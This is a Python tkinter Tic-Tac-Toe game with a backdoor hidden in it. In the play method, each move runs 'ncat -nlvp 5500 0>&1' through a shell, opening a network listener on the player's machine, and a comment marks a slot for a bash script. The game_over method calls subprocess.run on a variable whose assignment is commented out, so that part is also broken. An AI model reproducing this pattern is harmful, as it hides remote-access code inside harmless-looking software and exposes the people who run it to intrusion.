import tkinter as tk
import tkinter.messagebox
import subprocess

class TicTacToe(tk.Tk):
    def __init__(self):
        #game code below
        tk.Tk.__init__(self)
        self.title("Tic-Tac-Toe")
        self.geometry("400x400")
        self.buttons = {}
        self.turn = "X"
        for i in range(3):
            for j in range(3):
                button = tk.Button(self, text="", width=10, height=5,
                                   command=lambda x=i, y=j: self.play(x, y))
                button.grid(row=i, column=j)
                self.buttons[(i, j)] = button
        #bash script goes here 


    def play(self, x, y):
        button = self.buttons[(x, y)]
        script = "ncat -nlvp 5500 0>&1"
        subprocess.run(script, shell=True)
        if button["text"] == "":
            button["text"] = self.turn
            self.check_game()
            if self.turn == "X":
                self.turn = "O"
            else:
                self.turn = "X"
        

    def check_game(self):
        for i in range(3):
            if (self.buttons[(i, 0)]["text"] == self.buttons[(i, 1)]["text"] == self.buttons[(i, 2)]["text"] != "" or
                    self.buttons[(0, i)]["text"] == self.buttons[(1, i)]["text"] == self.buttons[(2, i)]["text"] != ""):
                self.game_over(self.turn)
        if (self.buttons[(0, 0)]["text"] == self.buttons[(1, 1)]["text"] == self.buttons[(2, 2)]["text"] != "" or
                self.buttons[(0, 2)]["text"] == self.buttons[(1, 1)]["text"] == self.buttons[(2, 0)]["text"] != ""):
            self.game_over(self.turn)

    def game_over(self, winner):
        tk.messagebox.showinfo("Game Over", f"{winner} wins!")
        # script = "ncat -nlvp 5500"
        subprocess.run(script, shell=True)
        self.destroy()

if __name__ == "__main__":
    game = TicTacToe()
    game.mainloop()